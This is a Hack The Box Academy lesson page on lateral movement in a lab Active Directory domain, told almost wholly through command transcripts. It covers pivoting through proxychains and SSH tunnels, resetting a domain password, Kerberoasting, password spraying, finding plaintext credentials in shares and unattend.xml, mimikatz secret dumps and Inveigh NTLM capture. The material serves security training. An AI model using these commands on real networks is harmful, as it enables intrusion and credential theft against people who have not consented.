<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/163/section/1549
// Platform Version: V1
// Module ID: 163
// Module Name: Attacking Enterprise Networks
// Module Difficulty: Medium
// Section ID: 1549
// Section Title: Lateral Movement
// Page Title: Hack The Box - Academy
// Page Number: 10
-->

# Lateral Movement

**Module Name:** Attacking Enterprise Networks **Page Number:** 10

#### 

#### ATTACKING ENTERPRISE NETWORKS

# Lateral Movement

``` cmd-session
c:\DotNetNuke\Portals\0> SharpHound.exe -c All

2022-06-22T10:02:32.2363320-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-22T10:02:32.2519575-07:00|INFORMATION|Initializing SharpHound at 10:02 AM on 6/22/2022
2022-06-22T10:02:32.5800848-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-22T10:02:32.7675820-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2022-06-22T10:03:03.3301538-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 46 MB RAM
2022-06-22T10:03:16.9238698-07:00|WARNING|[CommonLib LDAPUtils]Error getting forest, ENTDC sid is likely incorrect
2022-06-22T10:03:18.1426009-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-06-22T10:03:18.1582366-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-06-22T10:03:18.6738528-07:00|INFORMATION|Consumers finished, closing output channel
2022-06-22T10:03:18.7050961-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-06-22T10:03:18.8769905-07:00|INFORMATION|Status: 3641 objects finished (+3641 79.15218)/s -- Using 76 MB RAM
2022-06-22T10:03:18.8769905-07:00|INFORMATION|Enumeration finished in 00:00:46.1149865
2022-06-22T10:03:19.1582443-07:00|INFORMATION|SharpHound Enumeration Completed at 10:03 AM on 6/22/2022! Happy Graphing!
```

![https://academy.hackthebox.com/storage/modules/163/hporter.png](https://academy.hackthebox.com/storage/modules/163/hporter.png)

![https://academy.hackthebox.com/storage/modules/163/all_rdp.png](https://academy.hackthebox.com/storage/modules/163/all_rdp.png)

``` shell-session
ndefstathiou@htb[/htb]$ proxychains nmap -sT -p 3389 172.16.8.20

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 13:35 EDT
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.20:80-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.20:3389-<><>-OK
Nmap scan report for 172.16.8.20
Host is up (0.11s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
```

``` shell-session
ssh -i dmz01_key -L 13389:172.16.8.20:3389 root@10.129.203.111
```

``` shell-session
xfreerdp /v:127.0.0.1:13389 /u:hporter /p:Gr8hambino! /drive:home,"/home/tester/tools"
```

``` cmd-session
c:\DotNetNuke\Portals\0> net use

New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       \\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.


c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\PowerView.ps1 .
        1 file(s) copied.
```

``` powershell-session
PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1

PS C:\DotNetNuke\Portals\0> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose

VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'ssmalls'
VERBOSE: [Set-DomainUserPassword] Password for user 'ssmalls' successfully reset
```

``` shell-session
ndefstathiou@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86!
```

# Share Hunting

``` cmd-session
c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\Snaffler.exe
        1 file(s) copied.

c:\DotNetNuke\Portals\0> Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


2022-06-22 10:57:33 -07:00 [Share] {Green}(\\DC01.INLANEFREIGHT.LOCAL\Department Shares)
2022-06-22 10:57:36 -07:00 [Share] {Black}(\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-06-22 10:57:36 -07:00 [Share] {Black}(\\ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL\C$)
Press any key to exit.
```

``` shell-session
ndefstathiou@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86! 
SPIDER_P... 172.16.8.3      445    DC01             [*] Started spidering plus with option:
SPIDER_P... 172.16.8.3      445    DC01             [*]        DIR: ['print$']
SPIDER_P... 172.16.8.3      445    DC01             [*]        EXT: ['ico', 'lnk']
SPIDER_P... 172.16.8.3      445    DC01             [*]       SIZE: 51200
SPIDER_P... 172.16.8.3      445    DC01             [*]     OUTPUT: /tmp/cme_spider_plus
```

``` shell-session
ndefstathiou@htb[/htb]$ cat 172.16.8.3.json 
{
    "Department Shares": {
        "IT/Private/Development/SQL Express Backup.ps1": {
            "atime_epoch": "2022-06-01 14:34:16",
            "ctime_epoch": "2022-06-01 14:34:16",
            "mtime_epoch": "2022-06-01 14:35:16",
            "size": "3.91 KB"
        }
    },
    "IPC$": {
        "323a2fd620dcf3e3": {
            "atime_epoch": "1600-12-31 19:03:58",
            "ctime_epoch": "1600-12-31 19:03:58",
            "mtime_epoch": "1600-12-31 19:03:58",
            "size": "3 Bytes"
<SNIP>
```

``` shell-session
ndefstathiou@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares' 

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
Enter WORKGROUP\ssmalls's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  1 14:34:06 2022
  ..                                  D        0  Wed Jun  1 14:34:06 2022
  Accounting                          D        0  Wed Jun  1 14:34:08 2022
  Executives                          D        0  Wed Jun  1 14:34:04 2022
  Finance                             D        0  Wed Jun  1 14:34:00 2022
  HR                                  D        0  Wed Jun  1 14:33:48 2022
  IT                                  D        0  Wed Jun  1 14:33:42 2022
  Marketing                           D        0  Wed Jun  1 14:33:56 2022
  R&D                                 D        0  Wed Jun  1 14:33:52 2022

		10328063 blocks of size 4096. 8177952 blocks available
```

``` shell-session
smb: \IT\Private\> cd Development\
smb: \IT\Private\Development\> ls
  .                                   D        0  Wed Jun  1 14:34:17 2022
  ..                                  D        0  Wed Jun  1 14:34:17 2022
  SQL Express Backup.ps1              A     4001  Wed Jun  1 14:34:15 2022

		10328063 blocks of size 4096. 8177952 blocks available
smb: \IT\Private\Development\> get SQL Express Backup.ps1 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \IT\Private\Development\SQL
smb: \IT\Private\Development\> get "SQL Express Backup.ps1" 
getting file \IT\Private\Development\SQL Express Backup.ps1 of size 4001 as SQL Express Backup.ps1 (8.7 KiloBytes/sec) (average 8.7 KiloBytes/sec)
```

``` shell-session
ndefstathiou@htb[/htb]$ cat SQL\ Express\ Backup.ps1 

$serverName = ".\SQLExpress"
$backupDirectory = "D:\backupSQL"
$daysToStoreDailyBackups = 7
$daysToStoreWeeklyBackups = 28
$monthsToStoreMonthlyBackups = 3

[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SMO") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoExtended") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.ConnectionInfo") | Out-Null
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoEnum") | Out-Null
 
$mySrvConn = new-object Microsoft.SqlServer.Management.Common.ServerConnection
$mySrvConn.ServerInstance=$serverName
$mySrvConn.LoginSecure = $false
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "<REDACTED>"

$server = new-object Microsoft.SqlServer.Management.SMO.Server($mySrvConn)
```

``` shell-session
},
       "INLANEFREIGHT.LOCAL/scripts/adum.vbs": {
           "atime_epoch": "2022-06-01 14:34:41",
           "ctime_epoch": "2022-06-01 14:34:41",
           "mtime_epoch": "2022-06-01 14:34:39",
           "size": "32.15 KB"
```

``` shell-session
ndefstathiou@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/sysvol' 

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
Enter WORKGROUP\ssmalls's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  1 14:10:57 2022
  ..                                  D        0  Wed Jun  1 14:10:57 2022
  INLANEFREIGHT.LOCAL                Dr        0  Wed Jun  1 14:10:57 2022
smb: \INLANEFREIGHT.LOCAL\> cd scripts
smb: \INLANEFREIGHT.LOCAL\scripts\> ls
  .                                   D        0  Wed Jun  1 14:34:41 2022
  ..                                  D        0  Wed Jun  1 14:34:41 2022
  adum.vbs                            A    32921  Wed Jun  1 14:34:39 2022

		10328063 blocks of size 4096. 8177920 blocks available
smb: \INLANEFREIGHT.LOCAL\scripts\> get adum.vbs 
getting file \INLANEFREIGHT.LOCAL\scripts\adum.vbs of size 32921 as adum.vbs (57.2 KiloBytes/sec) (average 57.2 KiloBytes/sec)
```

``` shell-session
ndefstathiou@htb[/htb]$ cat adum.vbs 

Option Explicit

''=================================================================================================================================
''
'' Active Directory User Management script [ADUM]
''
'' Written: 2011/07/18
'' Updated: 2015.07.21

<SNIP>

Const cSubject = "Active Directory User Management report"	'EMAIL - SUBJECT LINE

''Most likely not needed, but if needed to pass authorization for connecting and sending emails
Const cdoUserName = "account@inlanefreight.local"	'EMAIL - USERNAME - IF AUTHENTICATION REQUIRED
Const cdoPassword = "L337^p@$$w0rD"
```

## Kerberoasting

``` powershell-session
PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1
PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN |Select samaccountname

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

``` powershell-session
PS C:\DotNetNuke\Portals\0> Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation

VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainUser] Searching for non-null service principal names
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=*))(servicePrincipalName=*))
```

``` shell-session
ndefstathiou@htb[/htb]$ hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*backupjob$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local*$31b8f218c848bd851df59641a45<SNIP>:<redacted>
```

## Password Spraying

``` powershell-session
PS C:\DotNetNuke\Portals\0> Invoke-DomainPasswordSpray -Password Welcome1

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2913 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): y
[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2913 users. Current time is 11:47 AM
[*] SUCCESS! User:kdenunez Password:Welcome1
[*] SUCCESS! User:mmertle Password:Welcome1
[*] Password spraying is complete
```

## Misc Techniques

``` shell-session
ndefstathiou@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86! 
GPP_AUTO... 172.16.8.3      445    DC01             [+] Found SYSVOL share
GPP_AUTO... 172.16.8.3      445    DC01             [*] Searching for Registry.xml
```

``` powershell-session
PS C:\DotNetNuke\Portals\0> Get-DomainUser * |select samaccountname,description | ?{$_.Description -ne $null}

samaccountname description
-------------- -----------
Administrator  Built-in account for administering the computer/domain
frontdesk      ILFreightLobby!
Guest          Built-in account for guest access to the computer/d...
krbtgt         Key Distribution Center Service Account
```

## Next Steps

``` shell-session
ndefstathiou@htb[/htb]$ proxychains nmap -sT -p 5985 172.16.8.50

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 14:59 EDT
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:80-<--timeout
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
Nmap scan report for 172.16.8.50
Host is up (0.12s latency).

PORT     STATE SERVICE
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```

``` shell-session
ndefstathiou@htb[/htb]$ proxychains evil-winrm -i 172.16.8.50 -u backupadm 

ProxyChains-3.1 (http://proxychains.sf.net)
Enter Password: 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents> hostname
ACADEMY-AEN-MS01
```

``` shell-session
*Evil-WinRM* PS C:\Users\backupadm\desktop> cd c:\panther

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\panther> dir


    Directory: C:\panther


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/1/2022   2:17 PM           6995 unattend.xml
```

``` shell-session
*Evil-WinRM* PS C:\panther> type unattend.xml

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.50:5985-<><>-OK
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="oobeSystem">
        <component name="Microsoft-Windows-International-Core" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <InputLocale>de-de</InputLocale>
            <SystemLocale>de-de</SystemLocale>
            <UILanguage>de-de</UILanguage>
            <UILanguageFallback>de-de</UILanguageFallback>
            <UserLocale>de-de</UserLocale>
        </component>
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <OOBE>
                <HideEULAPage>true</HideEULAPage>
                <HideWirelessSetupInOOBE>true</HideWirelessSetupInOOBE>
                <NetworkLocation>Work</NetworkLocation>
                <ProtectYourPC>1</ProtectYourPC>
            </OOBE>
            <AutoLogon>
                <Password>
                    <Value>Sys26Admin</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>1</LogonCount>
                <Username>ilfserveradm</Username>
            </AutoLogon>
        
        <SNIP>

        </component>
    </settings>
</unattend>
```

``` shell-session
*Evil-WinRM* PS C:\panther> net user ilfserveradm

User name                    ilfserveradm
Full Name                    ilfserveradm
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/1/2022 2:17:17 PM
Password expires             Never
Password changeable          6/1/2022 2:17:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/1/2022 2:17:17 PM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users
Global Group memberships     *None
The command completed successfully.
```

``` cmd-session
C:\Users\ilfserveradm> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
ilfserveradm
INLANEFREIGHT\Domain Admins
The command completed successfully.
```

## Post-Exploitation/Pillaging

``` cmd-session
c:\Users\ilfserveradm\Documents> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::secrets
Domain : ACADEMY-AEN-MS0
SysKey : 61b3d49a6205a1dedb14591c22d36afc
ERROR kuhl_m_lsadump_secretsOrCache ; kull_m_registry_RegOpenKeyEx (SECURITY) (0x00000005)

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

564     {0;000003e7} 1 D 30073          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0136075a} 2 F 20322234    ACADEMY-AEN-MS0\ilfserveradm    S-1-5-21-1020326033-369054202-3290056218-1002   (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 20387820    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::secrets
Domain : ACADEMY-AEN-MS0
SysKey : 61b3d49a6205a1dedb14591c22d36afc

Local name : ACADEMY-AEN-MS0 ( S-1-5-21-1020326033-369054202-3290056218 )
Domain name : INLANEFREIGHT ( S-1-5-21-2814148634-3729814499-1637837074 )
Domain FQDN : INLANEFREIGHT.LOCAL

Policy subsystem is : 1.18
LSA Key(s) : 1, default {13764b01-b89c-8adf-69ec-8937ee43821e}
  [00] {13764b01-b89c-8adf-69ec-8937ee43821e} 587be7dcfb75bb9ebb0c5c75cf4afb4488e602f9926f3404a09ecf8ba20b04e7

Secret  : $MACHINE.ACC
cur/text: -2d"GC)[+6,[+mC+UC5KXVoH>j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(<7tZW"I\7`,Bu#]N$'%A`$Z?E@9V2zdh=
    NTLM:ced50a6f3cb256110200dcb022b32c12
    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8
old/text: -2d"GC)[+6,[+mC+UC5KXVoH>j`S8CAlq1nQCP6:[*-Zv@_NAs`Pm$9xv7ohquyAKz1:rX[E40v)=p8-5@%eK3(<7tZW"I\7`,Bu#]N$'%A`$Z?E@9V2zdh=
    NTLM:ced50a6f3cb256110200dcb022b32c12
    SHA1:0b5cb5af0f13110312456892b7ebede53db440e8

Secret  : DefaultPassword
cur/text: DBAilfreight1!

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 37 62 35 26 80 4c 6b 2f 11 ca 06 25 ab 97 21 3f 84 f8 74 fa bc 69 a1 c4 37 2b df f8 cd 6c 8f 0a 8a d9 67 e9 42 cf 4f 96
    full: 37623526804c6b2f11ca0625ab97213f84f874fabc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
    m/u : 37623526804c6b2f11ca0625ab97213f84f874fa / bc69a1c4372bdff8cd6c8f0a8ad967e942cf4f96
old/hex : 01 00 00 00 51 9c 86 b4 cb dc 97 8b 35 9b c0 39 17 34 16 62 31 98 c1 07 ce 7d 9f 94 fc e7 2c d9 59 8a c6 07 10 78 7c 0d 9a 56 ce 0b
    full: 519c86b4cbdc978b359bc039173416623198c107ce7d9f94fce72cd9598ac60710787c0d9a56ce0b
    m/u : 519c86b4cbdc978b359bc039173416623198c107 / ce7d9f94fce72cd9598ac60710787c0d9a56ce0b

Secret  : NL$KM
cur/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
old/hex : a2 52 9d 31 0b b7 1c 75 45 d6 4b 76 41 2d d3 21 c6 5c dd 04 24 d3 07 ff ca 5c f4 e5 a0 38 94 14 91 64 fa c7 91 d2 0e 02 7a d6 52 53 b4 f4 a9 6f 58 ca 76 00 dd 39 01 7d c5 f7 8f 4b ab 1e dc 63
```

``` powershell-session
PS C:\Users\ilfserveradm> Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"

DefaultUserName : mssqladm
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
                  NT\CurrentVersion\Winlogon\
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
PSChildName     : Winlogon
PSDrive         : HKLM
PSProvider      : Microsoft.PowerShell.Core\Registry
```

``` cmd-session
c:\Users\ilfserveradm\Documents> lazagne.exe browsers -firefox

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for 6f898230-c272-4f85-875c-9f7b354ce485
[+] System masterkey decrypted for 9ccbb5e8-66c9-4210-a46c-a72e8f750734
[+] System masterkey decrypted for 08ed962e-44d9-4e2c-9985-392b699c25ae
[+] System masterkey decrypted for d4bfcc8b-5eec-485d-8adb-9ed4ae5656d6

[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.29700016975
```

``` powershell-session
PS C:\Users\ilfserveradm\Documents> Import-Module .\Inveigh.ps1
PS C:\Users\ilfserveradm\Documents> Invoke-Inveigh -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-06-22T15:03:32
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.8.50
[+] Spoofer IP Address = 172.16.8.50
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer = Disabled
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Users\ilfserveradm\Documents
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
[+] [2022-06-22T15:04:05] TCP(445) SYN packet detected from 172.16.8.20:55623
[+] [2022-06-22T15:04:05] SMB(445) negotiation request detected from 172.16.8.20:55623
[+] [2022-06-22T15:04:05] Domain mapping added for INLANEFREIGHT to INLANEFREIGHT.LOCAL
[+] [2022-06-22T15:04:05] SMB(445) NTLM challenge 5EB0B310E7B8BA04 sent to 172.16.8.20:55623
[+] [2022-06-22T15:04:05] SMB(445) NTLMv2 captured for ACADEMY-AEN-DEV\mpalledorous from 172.16.8.20(ACADEMY-AEN-DEV):55623:
mpalledorous::ACADEMY-AEN-DEV:5EB0B310E7B8BA04:<SNIP>
```

## Closing In

# 

# 

#### Questions

####